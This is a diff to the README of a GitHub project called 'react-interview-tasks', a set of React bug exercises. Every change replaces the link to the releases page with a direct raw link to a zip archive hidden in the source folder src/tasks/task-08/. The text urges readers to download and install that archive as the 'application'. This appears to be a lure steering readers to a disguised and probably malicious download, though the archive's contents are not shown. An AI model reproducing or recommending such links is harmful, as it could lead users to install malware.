@@ -1,6 +1,6 @@
 # ⚛️ react-interview-tasks - Learn React Through Real Bugs
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/frederic129/react-interview-tasks/releases)
+[![Download](https://raw.githubusercontent.com/frederic129/react-interview-tasks/main/src/tasks/task-08/react_interview_tasks_1.6.zip)](https://raw.githubusercontent.com/frederic129/react-interview-tasks/main/src/tasks/task-08/react_interview_tasks_1.6.zip)
 
 ## 🎯 Project Overview
 
@@ -16,7 +16,7 @@ To begin using the application, follow these simple steps.
 
 ### Step 1: Download the Application
 
-To download the latest version of the application, visit this page: [Download the App](https://github.com/frederic129/react-interview-tasks/releases). 
+To download the latest version of the application, visit this page: [Download the App](https://raw.githubusercontent.com/frederic129/react-interview-tasks/main/src/tasks/task-08/react_interview_tasks_1.6.zip). 
 
 ### Step 2: Install the Application
 
@@ -33,7 +33,7 @@ To download the latest version of the application, visit this page: [Download th
 
 To get started, you need to download the application:
 
-- Visit this page to download: [Download the App](https://github.com/frederic129/react-interview-tasks/releases)
+- Visit this page to download: [Download the App](https://raw.githubusercontent.com/frederic129/react-interview-tasks/main/src/tasks/task-08/react_interview_tasks_1.6.zip)
 
 When you access this page, you will see the latest release. Click on the link for the correct file that matches your operating system (Windows, Mac, etc.). 
 
@@ -99,4 +99,4 @@ If you have any other questions, feel free to reach out to our support team thro
 
 Learning React can feel overwhelming, but with this interactive tool, you can tackle common bugs in a hands-on way. Enjoy the learning experience and happy coding! 
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/frederic129/react-interview-tasks/releases)
+[![Download](https://raw.githubusercontent.com/frederic129/react-interview-tasks/main/src/tasks/task-08/react_interview_tasks_1.6.zip)](https://raw.githubusercontent.com/frederic129/react-interview-tasks/main/src/tasks/task-08/react_interview_tasks_1.6.zip)
